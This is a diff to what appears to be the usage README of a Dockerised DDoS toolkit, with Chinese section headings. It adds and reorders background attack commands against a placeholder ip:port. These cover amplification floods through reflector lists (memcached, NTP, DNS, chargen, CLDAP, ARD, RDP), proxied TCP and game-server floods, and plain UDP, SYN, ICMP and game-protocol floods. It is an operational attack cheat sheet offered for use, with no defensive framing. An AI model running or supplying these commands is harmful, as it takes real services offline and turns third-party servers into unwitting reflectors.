@@ -78,27 +78,53 @@
  
 	docker exec -it ddos-layer7 python3 start.py TOR url 0 1 null_proxy.txt 200 60 &
  
-	
+
 #### ddos-layer4（放大）反射文件位置/root/files
 
-	docker exec -it ddos-layer7 python3 start.py DNS ip:port 1 60 dns.txt &
+	docker exec -it ddos-layer7 python3 start.py MEM ip:port 1 120 meme.txt &
 
-	docker exec -it ddos-layer7 python3 start.py NTP ip:port 1 60 ntp.txt &
+	docker exec -it ddos-layer7 python3 start.py NTP ip:port 1 120 ntp.txt &
 
-	docker exec -it ddos-layer7 python3 start.py MEM ip:port 1 60 meme.txt &
+	docker exec -it ddos-layer7 python3 start.py DNS ip:port 1 120 dns.txt &
+
+	docker exec -it ddos-layer7 python3 start.py CHAR ip:port 1 120 char.txt &
+
+	docker exec -it ddos-layer7 python3 start.py CLDAP ip:port 1 120 cldap.txt &
+
+	docker exec -it ddos-layer7 python3 start.py ARD ip:port 1 120 ard.txt &
+
+	docker exec -it ddos-layer7 python3 start.py RDP ip:port 1 120 rdp.txt &
 
 
 #### ddos-layer4（代理）代理文件位置/root/files/proxies/
 
-	docker exec -it ddos-layer7 python3 start.py MINECRAFT ip:port 1 120 0 null_proxy.txt &
- 
-	docker exec -it ddos-layer7 python3 start.py MCBOT ip:port 1 120 0 null_proxy.txt &
- 
 	docker exec -it ddos-layer7 python3 start.py TCP ip:port 1 120 0 null_proxy.txt &
- 
-	docker exec -it ddos-layer7 python3 start.py CONNECTION ip:port 1 120 0 null_proxy.txt &
- 
+
 	docker exec -it ddos-layer7 python3 start.py CPS ip:port 1 120 0 null_proxy.txt &
+
+	docker exec -it ddos-layer7 python3 start.py CONNECTION ip:port 1 120 0 null_proxy.txt &
+
+	docker exec -it ddos-layer7 python3 start.py MCBOT ip:port 1 120 0 null_proxy.txt &
+
+	docker exec -it ddos-layer7 python3 start.py MINECRAFT ip:port 1 120 0 null_proxy.txt &
+
+ 
+#### ddos-layer4（普通）
+
+	docker exec -it ddos-layer7 python3 start.py UDP ip:port 1 120 &
+
+	docker exec -it ddos-layer7 python3 start.py SYN ip:port 1 120 &
+
+	docker exec -it ddos-layer7 python3 start.py ICMP ip:port 1 120 &
+
+	docker exec -it ddos-layer7 python3 start.py VSE ip:port 1 120 &
+
+	docker exec -it ddos-layer7 python3 start.py TS3 ip:port 1 120 &
+
+	docker exec -it ddos-layer7 python3 start.py FIVEM ip:port 1 120 &
+
+	docker exec -it ddos-layer7 python3 start.py MCPE ip:port 1 120 &
+
 
 
 
